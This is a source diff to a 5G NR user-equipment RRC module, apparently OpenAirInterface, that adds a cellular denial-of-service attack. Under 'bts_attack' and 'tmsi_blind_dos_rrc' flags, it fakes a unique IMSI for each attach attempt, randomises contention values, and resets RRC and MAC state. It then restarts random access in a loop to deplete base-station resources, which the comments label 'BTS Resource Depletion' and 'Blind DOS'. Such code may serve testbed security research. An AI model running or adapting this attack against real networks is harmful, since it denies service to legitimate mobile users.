@@ -75,6 +75,13 @@
 
 #include "nr_nas_msg_sim.h"
 
+#include "attack_extern.h"      /* bts_attack, bts_delay, dnlink_dos_attack, uplink_dos_attack, rep_conn_end_count, null_cipher_integ, tmsi_blind_dos_rrc */
+#include <stdlib.h>             /* srand () and rand () for _ra_restart_counter*/
+
+// New attack variables
+static unsigned int _btsIMSIByte = 0;
+static int _ra_restart_counter = 0;
+
 NR_UE_RRC_INST_t *NR_UE_rrc_inst;
 /* NAS Attach request with IMSI */
 static const char  nr_nas_attach_req_imsi[] = {
@@ -1303,6 +1310,13 @@ static void rrc_ue_generate_RRCSetupComplete(
     as_nas_info_t initialNasMsg;
     nr_ue_nas_t *nas = get_ue_nas_info(ctxt_pP->module_id);
     generateRegistrationRequest(&initialNasMsg, nas);
+    if (bts_attack >= 5) {
+      LOG_E(RRC, "[BTS_ATTACK_ITEM_01]: Create a unique IMSI for each RRC attach attempt\n");
+      // Create a unique (monotonically increasing) IMSI for each attach (n.b., BCD encoding, below)
+      initialNasMsg.data[11] = (_btsIMSIByte % 10) | ((_btsIMSIByte / 10) << 4);
+      if (++_btsIMSIByte == 100)
+	      _btsIMSIByte = 0;
+    }
     nas_msg = (char*)initialNasMsg.data;
     nas_msg_length = initialNasMsg.length;
   } else {
@@ -1643,6 +1657,9 @@ void nr_rrc_ue_process_securityModeCommand(const protocol_ctxt_t *const ctxt_pP,
  void nr_rrc_ue_generate_RRCSetupRequest(module_id_t module_id, const uint8_t gNB_index) {
    uint8_t i=0,rv[6];
 
+   LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+   srand(_ra_restart_counter+1);
+
    if(NR_UE_rrc_inst[module_id].Srb0[gNB_index].Tx_buffer.payload_size ==0) {
      // Get RRCConnectionRequest, fill random for now
      // Generate random byte stream for contention resolution
@@ -1651,10 +1668,12 @@ void nr_rrc_ue_process_securityModeCommand(const protocol_ctxt_t *const ctxt_pP,
        // if SMBV is configured the contention resolution needs to be fix for the connection procedure to succeed
        rv[i]=i;
  #else
-       rv[i]=taus()&0xff;
+       rv[i]=rand() % 0xFF; //taus()&0xff; // new: introduce some randomness to different UEs
  #endif
        LOG_T(NR_RRC,"%x.",rv[i]);
      }
+     ++_ra_restart_counter;
+     
 
      LOG_T(NR_RRC,"\n");
      NR_UE_rrc_inst[module_id].Srb0[gNB_index].Tx_buffer.payload_size =
@@ -2374,6 +2393,70 @@ void *rrc_nrue_task(void *args_p)
         break;
 
       case NAS_UPLINK_DATA_REQ: {
+        LOG_E(RRC, "[NAS MSG]: NAS_UPLINK_DATA_REQ\n");
+
+        // Trigger log when we see a non-attack NAS message length
+        if (!IS_SOFTMODEM_RFSIM && (bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length != -1) {
+	        const char *_logAtt = tmsi_blind_dos_rrc /* > 0 */ ? "BLIND_DOS_ATTACK" : "BTS_ATTACK";
+          LOG_E(RRC, "[%s NAS_UPLINK_DATA_REQ]: NAS Message Length = %i\n", _logAtt, NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length);
+        }
+                          
+        if ((bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length == -1) {
+          const char *_logEAtt;
+          const char *_logIAtt;
+
+          if (tmsi_blind_dos_rrc /* > 0 */) {
+            _logEAtt = "BLIND_DOS_ATTACK_ITEM_03";
+            _logIAtt = "Blind DOS";
+          }
+          else {
+            _logEAtt = "BTS_ATTACK_ITEM_03";
+            _logIAtt = "BTS Resource Depletion";
+          }
+          LOG_E(RRC, "[%s]: Generating NAS UL Data Request, revert back to PRACH (primary attack functionality)\n", _logEAtt);
+          usleep(bts_delay * 1000);
+
+          LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+          if (_ra_restart_counter <= 0)
+            break; // The UE will generate Attach req upon starting, so filter it...
+          int gNB_index = 0; // TODO: Is it ok to hardcode the gNB index?
+          int CC_id = 0; // use 0 for carrier ID?
+          int module_id = ctxt.module_id;
+          LOG_I(RRC, "[%s] Receive communication back from NAS, UE restarting random access procedure\n", _logIAtt);
+          // reset UE parameters
+          // PHY Layer, PHY_VARS_NR_UE
+          // TODO: reset physical layer for NR?
+          // PHY_vars_UE_g[module_id][CC_id]->UE_mode[gNB_index] = PRACH;
+          // for (int i=0; i <RX_NB_TH_MAX; i++ ) {
+          //   PHY_vars_UE_g[module_id][CC_id]->pdcch_vars[i][gNB_index]->crnti_is_temporary = 0;
+          //   PHY_vars_UE_g[module_id][CC_id]->pdcch_vars[i][gNB_index]->crnti = 0;
+          //   PHY_vars_UE_g[module_id][CC_id]->ulsch_Msg3_active[gNB_index] = 0;
+          // }
+
+          // MAC Layer
+          // ue_mac_reset(module_id, gNB_index);
+          // RRC Layer
+          // openair_rrc_ue_init(module_id, gNB_index); // TODO rrc ue init in NR?
+          nr_rrc_set_state(module_id, RRC_STATE_IDLE_NR);
+          // NR_UE_rrc_inst[module_id].Info[gNB_index].State=RRC_STATE_IDLE_NR;
+          NR_UE_rrc_inst[module_id].Srb0[gNB_index].Tx_buffer.payload_size = 0; // clear Srb0 buffer
+          NR_UE_rrc_inst[module_id].Srb0[gNB_index].Rx_buffer.payload_size = 0;
+
+          // Ref: openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c nr_ra_failed()
+          // restart RA Procedure
+          NR_UE_MAC_INST_t *mac = get_mac_inst(module_id);
+          mac->state = UE_PERFORMING_RA;
+          RA_config_t *ra = &mac->ra;
+          ra->RA_active = 1;
+          ra->first_Msg3 = 1;
+          ra->ra_PreambleIndex = -1;
+          ra->ra_state = RA_UE_IDLE;
+          // stop_meas(&UE_mac_inst[module_id].ue_scheduler);
+          break;
+        }
+
+        LOG_E(RRC, "[NORMAL PROCESSING]: Generating NAS UL Data Request\n");
+
         uint32_t length;
         uint8_t *buffer;
         LOG_I(NR_RRC, "[UE %d] Received %s: UEid %d\n", ue_mod_id, ITTI_MSG_NAME (msg_p), NAS_UPLINK_DATA_REQ (msg_p).UEid);
